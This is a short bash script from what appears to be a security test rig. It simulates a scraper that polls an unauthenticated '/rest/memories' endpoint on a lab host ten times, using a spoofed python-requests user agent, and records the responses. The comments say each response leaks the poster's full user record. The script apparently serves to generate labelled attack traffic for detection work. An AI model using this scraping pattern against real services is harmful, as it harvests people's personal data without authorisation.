#!/usr/bin/env bash
# TAP-02 variant a (PRD §4.1, KI-59): a scraper polls the photo wall, GET /rest/memories, 10 times 3 s apart.
# No login; each memory carries its poster's whole Users row. A python-requests user agent, as a scraper's.
# Runs inside the rig's tools container only.
# tool: curl 8.x (lib/capture.sh)
# label: leaky tap: /rest/memories polled 10 times, python-requests user agent
set -eu
. /attacks/lib/capture.sh
for i in $(seq 10); do
  [ "$i" -gt 1 ] && sleep 3
  req -A 'python-requests/2.32.3' http://10.66.0.10/rest/memories
done
cut -f2- /out/responses/index.tsv
